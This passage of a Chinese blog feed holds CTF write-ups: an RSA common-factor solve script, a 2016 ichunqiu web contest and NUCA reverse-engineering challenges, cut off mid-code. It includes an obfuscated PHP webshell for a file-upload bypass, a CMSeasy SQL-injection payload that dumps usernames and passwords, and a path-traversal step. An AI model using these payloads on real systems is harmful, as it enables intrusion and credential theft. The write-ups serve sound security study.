class="number">108082147276398906822234149167480016132157014049560913761488880190018027488520386318253742675423286348552334110023434741671427911613197684395221211646299519273129194692306445874938199068586137486874290442314459278649345469626426790676801658394799404284116771456479272808343825651929906737811050557836671896732124546721747709022607151231423494815945385193624295868730390462068156825588342737037490320356361648437686597791</span></span><br><span class="line">f4 = <span class="number">108082147276398906822234149167480016132157014049560913761488880190018027488520386318253742675423286348552334110023434741671427911613197684395221211646299519273129194692306445874938199068586137486874290442314459278649345469626426790676801658394799404284116771456479272808343825651929906737811050557836671896732124546721747709022607151231423494815945385193624295868730390462068156825588342737037490320356361648437686600843</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N = <span class="number">136463296143190893248608270448493439350683115492680876168052084053504347848230208722375209906076869052896867483336405778205506777456239889195254751404720423599579856449118314029926341504368322006603240157122006887052352260584975471045726061549619820648607756554188235927302932154082823424745427535138517580059079182622982686168676727690710935334448342460007367100561867135456783067679052102951400317012276135721843672557488711786097028300122487504246207343408690682175135816894247936690735246673985277504237071409859401185555290479154689954442396078547166388871978321863215123445269948324347122830270551854130365741961149443091305418900821360286967705810624380568422193310901491451664233271486835428015602712828527839237760712498204208114606471362410690870710499020885304151928570632315330437235330924071236528549152143092328833484016372976817809299430339752106123272706667690980774118545338761390919046832338928913059106351087015273177895380149217373395580948428521961929052291618261409715145038026920685297885235683434107218249548518659574493203836870070093674704878498465104238178877833471640168999551981025958271865584457582649595664499635489167898398826429084686279399959537724187268210760718340639939389766681703213695409551029265784749153180083564347733676434492122290166926822855552175712346350104533901079605669192289178418165584907326210349152609265563881542151049862642882025360604692084264752182798892702414638180781403398216616666472863758371330058299406233359567750413748257953598843651612399709945608339073191578573877985362619301768016485017815171486743934037935902150228210340093187387036580763941637989511155597643722984057627086517479392172108031663245553269</span></span><br><span class="line"></span><br><span class="line">enc_1 = <span class="number">7106898334865955962704663230185766445951889978440527670379641714370681285859949869949187832359082523864224641583685587358279064795569170851524374568027152395396233789347594775999482749460592054691082921627513982308507181335532299134140407681024881476418889411780375090299905813982101694827597560498543197874412334623795312307111560405270260391658994764065881380399694265015620683173527502434421206862766543229116921174206929733891873772589067987314963792051855633244006474202333168597001157421208180748203884266562430752691702675420434792273754214010918653607624500201387229281379420620532777072560178585294886033718995698223904867539921848198115466603585461755489085844144950962514847839122794545452937035169471880080923607755994138855467643267829059636266176328056201003864357129609343207959211080595752950950566686954867562406898169012</span></span><br><span class="line"></span><br><span class="line">enc_2 = <span class="number">6049049661741129561339303988250162617703359741970199356749378099535308799521119296163475813567458644038456685905251522625056377260310087845057811228022836098917570328692580410899852889868960996513905266043335963520913743708134923879544500911079066640658342641576456724637857109609913138972587873848795314132791317122747052648231297078735128282339170389129703582587817548539040826603188468662975329145727078616857156409325283263490433476018586450960082502578543327451065633585123695731081960986876439520499678158646526292218543279767834119677467758578802705169018711527506297869276113561542222807369071584959189923897216079505316482443445467837921144205079761354928950270172051270453170856002545491432278972735662895438668870901370521394906635478044848448535690635490093836659267778026686404695474454443310769209580317339039949689309577128</span></span><br><span class="line"></span><br><span class="line">enc_3 = <span class="number">9297802808564228678857927735224258610176831223455462482108153962953283311112501933779642540831558523911908205264682548531027493458025348252477502958948277516597689610204247227516319189048436710254675204218913508162139428248916620471317757210444645620644754294112426431692939788347835259617673728076204145049918767636122119264147566892091600628134179775710906591426338082246629946748851355701691716873854064848390273287305765646761438968986164159947841015011854342290060053810459830057357847548324695563067411557873081187572229935066117850179208775004384867270372650455853756560763012162682268812544173997311505136324203900399349629488710197844813293107115270398692552357803651576615589484454781227778727051440858478438251726051391317986762487421941570502251822920317312304622541764818356928105898291743494415190324388360012261032469805293</span></span><br><span class="line"></span><br><span class="line">enc_4 = <span class="number">713095983409993528016630065648951013409887429450761159296479210782308084847050785300379490902448647458053364322993274237841476340954537003347555548992827654062094884577630320399338426853024680425709980978726290825928571411715417634212022523987025390940108095446209802316068849127107378425087055832984628808129531097287891984529260048649164000341136589805930287941174070455962380115617312855801447326371361475429811263285218112383055283949280091896985779211927696867430269968278138068400828124612158603851472016327854927370226178776190765638542240547246882872033038792494915187774790763271179846203704834184269540668646905004118327597860873987248913148268250014480899515845595580486997925049895214602419037682253683176691877538075243485739730794370764108792093424342949560517002862934953109055108423633725444594683266260073663364732952255</span></span><br><span class="line"></span><br><span class="line">enc_5 = <span class="number">10309778311674135836145162475142299890445328570998831868156889990227275287204954712195141311549279047953844775828171871944522109110470024787792366772581241453340259883183812924297131077506375091086889140550405275547002202216935333211274901846970064522877611909017778486075399188006657623263902100044828896866180655435221665929435914366779334701622735670714649165956831390471034827078404866534094264914677879030956272977839491780410171625330771079943455183946885337962048237633491024513227027839179415230496573264968451527246966618074421625677382526573096067979952606553854268016651712174361578916100364115941853700612277618158243626702349480460819792765645689509997114148748479096516230468934427015454217368508102362912163051749856763103972010705773880053579573724226945229453471505368052572019992934401394664840254259798167531746190494146</span></span><br><span class="line"></span><br><span class="line">enc_6 = <span class="number">8939535907261295438433886577386432968291926162277924912979941380189504000322310159787894619015550096747658897136943700072192920334615223423230154197591756541966832740944457435736068401948276698864982347929802551347213730712997519211436818145872722485367264219104124473346589051164722340414948298088909961344463800461486219156960782319672049123860381674970981713865865119998917955886468613202521879160392276542945726096267432761588212550950818569769983241315782390152313705093940640027041352082844550311829177150159737347964813330180325283882516072009654288888676591648012847062527444169352000893928289409020106115561912814987882374652419114381836807085680725260815445689968522849732254659773192714360607196619281714422460754645088867512471482029657153787836396684484646302575186890717770078233479877360251173401000006298555695416782863190</span></span><br><span class="line"></span><br><span class="line">N = f3 * f4</span><br><span class="line">phi = (f3<span class="number">-1</span>)*(f4<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"><span class="keyword">print</span> `hex(pow(enc_1, d, N))`[<span class="number">3</span>:<span class="number">-1</span>].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">N = f2 * f4</span><br><span class="line">phi = (f2<span class="number">-1</span>)*(f4<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"><span class="keyword">print</span> `hex(pow(enc_2, d, N))`[<span class="number">3</span>:<span class="number">-1</span>].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">N = f1 * f4</span><br><span class="line">phi = (f1<span class="number">-1</span>)*(f4<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"><span class="keyword">print</span> `hex(pow(enc_3, d, N))`[<span class="number">3</span>:<span class="number">-1</span>].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">N = f1 * f3</span><br><span class="line">phi = (f1<span class="number">-1</span>)*(f3<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"><span class="keyword">print</span> `hex(pow(enc_4, d, N))`[<span class="number">3</span>:<span class="number">-1</span>].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">N = f1 * f2</span><br><span class="line">phi = (f1<span class="number">-1</span>)*(f2<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"><span class="keyword">print</span> `hex(pow(enc_5, d, N))`[<span class="number">3</span>:<span class="number">-1</span>].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">N = f2 * f3</span><br><span class="line">phi = (f2<span class="number">-1</span>)*(f3<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"><span class="keyword">print</span> `hex(pow(enc_6, d, N))`[<span class="number">3</span>:<span class="number">-1</span>].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br></pre></td></tr></table></figure><p>最终简单的拿到了flag</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>百度杯 CTF夺旗大赛 ---ichunqiu</title>
      <link href="2016-ichunqiu-September.html"/>
      <url>2016-ichunqiu-September.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>第一周</p><h1 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h1><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-22-18-22.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-22-18-22.jpg"></a></p><p>什么文件都能上传 但是过滤了 &lt;？和php  </p><p>上传 内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;pHp&gt;$a &#x3D; chr(&quot;97&quot;).ssert;$a($_POST[a]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>密码为a 菜刀连一下  查看源代码能看到上传地质为 /u/1.php</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-22-36-46.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-22-36-46.jpg"></a></p><p>就能找到flag了</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-22-37-21.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-22-37-21.jpg"></a></p><h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><p>这是一个原题  还好玩了NUCA的练习赛<br>[原题链接</p><p>](<a href="http://www.hetianlab.com/html/news/news-2016072907.html">http://www.hetianlab.com/html/news/news-2016072907.html</a>)</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-22-40-51.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-22-40-51.jpg"></a></p><p>构造view-source:<a href="http://909016d9650e4ced96fbbfc0b0f61f69d1996142d4d34845.game.ichunqiu.com/index.php?jpg=index.php%E5%B9%B6%E8%A7%A3%E7%A0%81%E3%80%82%E5%BE%97%E5%88%B0index.php%E7%9A%84%E6%BA%90%E7%A0%81%E5%86%85%E5%AE%B9%EF%BC%8C%E5%A6%82%E4%B8%8B%E6%89%80%E7%A4%BA">http://909016d9650e4ced96fbbfc0b0f61f69d1996142d4d34845.game.ichunqiu.com/index.php?jpg=index.php并解码。得到index.php的源码内容，如下所示</a><br><a href="http://oayoilchh.bkt.clouddn.com/2016-09-03-22-42-59.jpg" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016-09-03-22-42-59.jpg"></a><br>可以看到一个正则 将 <code>-</code> 改为<code>config</code> 这个正则等下会用到 </p><p>然后根据原题的writeup 这个题目应该也是有一个<code>.idea/workspace.xml</code>的文件泄露<br>我们访问一下 </p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-22-46-39.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-22-46-39.jpg"></a></p><p>我们会看到一个名字叫<code>fl3g_ichunqiu.php</code>的文件  根据wp  我们知道这是一个加密算法文件 读取一下 根据 上面的正则 我们知道 应该访问的是<code>index.php?jpg=fl3gconfigichuqiu.php</code> 再解码得到加密函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment">* Created by PhpStorm. </span></span><br><span class="line"><span class="comment">* Date: 2015/11/16 </span></span><br><span class="line"><span class="comment">* Time: 1:31 </span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE); </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params">$length, $chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#x27;</span></span>) </span>&#123; </span><br><span class="line">   $hash = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">   $max = strlen($chars) - <span class="number">1</span>; </span><br><span class="line">   <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++)&#123; </span><br><span class="line">       $hash .= $chars[mt_rand(<span class="number">0</span>, $max)]; </span><br><span class="line">   &#125; </span><br><span class="line">   <span class="keyword">return</span> $hash; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params">$txt,$key</span>)</span>&#123; </span><br><span class="line">   <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123; </span><br><span class="line">       $tmp .= chr(ord($txt[$i])+<span class="number">10</span>); </span><br><span class="line">   &#125; </span><br><span class="line">   $txt = $tmp; </span><br><span class="line">   $rnd=random(<span class="number">4</span>); </span><br><span class="line">   $key=md5($rnd.$key); </span><br><span class="line">   $s=<span class="number">0</span>; </span><br><span class="line">   <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123; </span><br><span class="line">       <span class="keyword">if</span>($s == <span class="number">32</span>) $s = <span class="number">0</span>; </span><br><span class="line">       $ttmp .= $txt[$i] ^ $key[++$s]; </span><br><span class="line">   &#125; </span><br><span class="line">   <span class="keyword">return</span> base64_encode($rnd.$ttmp); </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params">$txt,$key</span>)</span>&#123; </span><br><span class="line">   $txt=base64_decode($txt); </span><br><span class="line">   $rnd = substr($txt,<span class="number">0</span>,<span class="number">4</span>); </span><br><span class="line">   $txt = substr($txt,<span class="number">4</span>); </span><br><span class="line">   $key=md5($rnd.$key); </span><br><span class="line"></span><br><span class="line">   $s=<span class="number">0</span>; </span><br><span class="line">   <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123; </span><br><span class="line">       <span class="keyword">if</span>($s == <span class="number">32</span>) $s = <span class="number">0</span>; </span><br><span class="line">       $tmp .= $txt[$i]^$key[++$s]; </span><br><span class="line">   &#125; </span><br><span class="line">   <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($tmp);$i++)&#123; </span><br><span class="line">       $tmp1 .= chr(ord($tmp[$i])<span class="number">-10</span>); </span><br><span class="line">   &#125; </span><br><span class="line">   <span class="keyword">return</span> $tmp1; </span><br><span class="line">&#125; </span><br><span class="line">$username = decrypt($_COOKIE[<span class="string">&#x27;user&#x27;</span>],$key); </span><br><span class="line"><span class="keyword">if</span> ($username == <span class="string">&#x27;system&#x27;</span>)&#123; </span><br><span class="line">   <span class="keyword">echo</span> $flag; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">   setcookie(<span class="string">&#x27;user&#x27;</span>,encrypt(<span class="string">&#x27;guest&#x27;</span>,$key)); </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;â®(â¯â½â°)â­&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最后用wp的poc 得到了16个加密密文  用burp跑一下就能得到flag了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;92b5f008-4cfb-4f16-abdb-3475e2d0f543&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="YeserCMS"><a href="#YeserCMS" class="headerlink" title="YeserCMS"></a>YeserCMS</h1><p>MD  什么YeserCMS 明明是cmseasy</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-22-58-52.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-22-58-52.jpg"></a></p><p>管理员账户是amdin<br>我先找一下后台好了  访问<code>robots.txt</code><br>发现两个重要的地方</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-22-59-47.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-22-59-47.jpg"></a></p><p>一个是后台地址 一个好像也是告诉我flag 在flag.php 里面 但是直接访问读不出来</p><p>百度一下cmseasy的漏洞 找到一个payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xajax&#x3D;Postdata&amp;xajaxargs[0]&#x3D;&lt;xjxquery&gt;&lt;q&gt;detail&#x3D;xxxxxxNaN&lt;&#x2F;q&gt;&lt;&#x2F;xjxquery&gt;xajax&#x3D;Postdata&amp;xajaxargs[0]&#x3D;&lt;xjxquery&gt;&lt;q&gt;detail&#x3D;xxxxxx&#39;,(UpdateXML(1,CONCAT(0x5b,mid((SELECT&#x2F;**&#x2F;GROUP_CONCAT(concat(username,&#39;|&#39;,password)) from yesercms_user),20,50),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;&#x2F;q&gt;&lt;&#x2F;xjxquery&gt;</span><br></pre></td></tr></table></figure><p>两次url编码后post注入  注入点是<code>/celive/live/header.php</code></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-23-49-59.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-23-49-59.jpg"></a></p><p>拼接一下得到flag的md5值</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-23-55-46.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-23-55-46.jpg"></a></p><p>解密出来是 <code>Yser231</code><br>访问 /index.php?admin_dir=admin&amp;site=default<br>进入到后台</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-04-00-02-56.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-04-00-02-56.jpg"></a></p><p>然后就各种找getshell  没有一个成功<br>后来发现  有一个地方 模版&gt;当前模版编辑</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-ichunqiu-sep-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-ichunqiu-sep-01.jpg"></a></p><p>点击<code>编辑</code>并抓包</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-ichunqiu-set-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-ichunqiu-set-02.jpg"></a></p><p>改id为<code>../../flag.php</code><br>get flag<br><code>flag&#123;0873701b-aa86-4d7c-b785-3f2c57650157&#125;</code></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> i春秋-百度杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>全国高校网安联赛--逆向篇</title>
      <link href="2016-NUCA-Reverse-Writeup.html"/>
      <url>2016-NUCA-Reverse-Writeup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>做出来的题目不多呢 后面还是靠着师傅们的帮忙才多做出来了一点  <strong>**</strong> 六星一点活路都不给人留，顺便吐槽一下出题方，以后能不能自己先测试一下再放题阿，两个题有问题。<br><a href="https://yunpan.cn/cM8iTF8Lw7XYg">附上题目以及脚本</a>（提取码：8b00）</p><h1 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h1><p>真签到题 直接给flag好嘛。。。 对得起分数</p><h1 id="ezpz"><a href="#ezpz" class="headerlink" title="ezpz"></a>ezpz</h1><p>64分题是不是要告诉我有 <code>base64</code>阿<br>找到check函数</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-ezpz.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-ezpz.png"></a></p><p>就应该base64encode 直接strcmp 查看<code>res</code>的值</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-ezpz_2.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-ezpz_2.png"></a></p><p>解编码就能得到flag</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-ezpz_3.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-ezpz_3.png"></a></p><h1 id="Transformation"><a href="#Transformation" class="headerlink" title="Transformation"></a>Transformation</h1><p>这个送分题也没谁了。。比ezpz还不如。。。<br>没记错的话这个好像就是flag</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-Transformation_1.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-Transformation_1.png"></a></p><h1 id="Androidbaby"><a href="#Androidbaby" class="headerlink" title="Androidbaby"></a>Androidbaby</h1><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-Androidbaby_1.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-Androidbaby_1.png"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-Androidbaby_2.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-Androidbaby_2.png"></a></p><p>输入字串a先与自己的角标异或，再与{ 13, 9, 6, 9, 93, 1, 14, 84, 9, 14, 6, 91, 10, 5, 89, 6, 28, 23, 69, 65 }分别异或<br>记{ 13, 9, 6, 9, 93, 1, 14, 84, 9, 14, 6, 91, 10, 5, 89, 6, 28, 23, 69, 65 }为b<br>for i in xrange(20):<br> ord(a[i])^i^b[i]<br>得到20个数字，通过(c[2*i]-48)<em>10+(c[2</em>i+1]-48)公式，得到10个数字 </p><p><code>下面两题是汪师傅和Joke师傅做出来的</code></p><h1 id="Babyfuscator"><a href="#Babyfuscator" class="headerlink" title="Babyfuscator"></a>Babyfuscator</h1><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-Babyfuscator_1.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-Babyfuscator_1.png"></a></p><p>题如其名字 ，真是叫一个乱七八糟阿  每个字节都参与了运算。。。好复杂</p><p>通过动态调试以及其他的方法可以提取指令<br>拿到指令后 爆破一下就拿到flag了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">  puts(&quot;The world is in chaos, time to show your real power:&quot;);</span><br><span class="line">  while ( v5 &lt; 32 )</span><br><span class="line">    read(0, &amp;v3[v5++], 1uLL);&#x2F;&#x2F;get_input</span><br><span class="line">  v4 &#x3D; 0;</span><br><span class="line">  game((__int64)v3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void __fastcall __noreturn game(__int64 a1)</span><br><span class="line">if ( v1 + 4239419545LL &lt;&#x3D; 0xFFFFFFFFLL )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( ((unsigned __int8)((((((((((((*(_BYTE *)(a1 + 31) ^ 8) + 7) ^ 0x2C) + 6) ^ 0x3C) + 3) ^ 0x17) + 8) ^ 0x30) + 6) ^ 0x3C)</span><br><span class="line">                            + 6) ^ 0x17) &#x3D;&#x3D; 56 )</span><br><span class="line">      &#123;</span><br><span class="line">        printf(&quot;Congratulations!The flag is %s\n&quot;, a1);</span><br><span class="line">        exit(0);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"> 直接angr符号执行即可得到flag：</span><br><span class="line">find&#x3D;0x4020DF, avoid&#x3D;0x4020FE</span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-brute.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-brute.png"></a></p><h1 id="indirect"><a href="#indirect" class="headerlink" title="indirect"></a>indirect</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">题目以寄存器形式call</span><br><span class="line">int __cdecl sub_401140(int a1)获取输入</span><br><span class="line">&#123;</span><br><span class="line">  void *v1; &#x2F;&#x2F; ST08_4@1</span><br><span class="line">  int result; &#x2F;&#x2F; eax@1</span><br><span class="line"></span><br><span class="line">  v1 &#x3D; malloc(0xFu);</span><br><span class="line">  (*(void (__cdecl **)(_DWORD))(*(_DWORD *)a1 + 12))(**(_DWORD **)(a1 + 8));</span><br><span class="line">  (*(void (**)(const char *, ...))(*(_DWORD *)a1 + 16))(&quot;%s&quot;, v1);&#x2F;&#x2F;get input</span><br><span class="line">  result &#x3D; *(_DWORD *)(a1 + 4);</span><br><span class="line">  *(_DWORD *)(result + 8) &#x3D; v1;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int __cdecl sub_4011D0(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  int result; &#x2F;&#x2F; eax@1</span><br><span class="line">  int v2; &#x2F;&#x2F; ST04_4@5</span><br><span class="line">  int v3; &#x2F;&#x2F; [sp+4h] [bp-14h]@1</span><br><span class="line">  signed int i; &#x2F;&#x2F; [sp+8h] [bp-10h]@1</span><br><span class="line"></span><br><span class="line">  result &#x3D; *(_DWORD *)(a1 + 4);</span><br><span class="line">  sub_4011D0 函数</span><br><span class="line">v3 &#x3D; *(_DWORD *)(result + 8);</span><br><span class="line">  for ( i &#x3D; 0; i &lt; 15; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( i + (signed __int16)(*(_BYTE *)(*(_DWORD *)(*(_DWORD *)(a1 + 8) + 16) + i) ^ *(_BYTE *)(i + v3) &amp; 0xF) !&#x3D; *(_DWORD *)(**(_DWORD **)(a1 + 4) + 4 * i)</span><br><span class="line">      || (signed 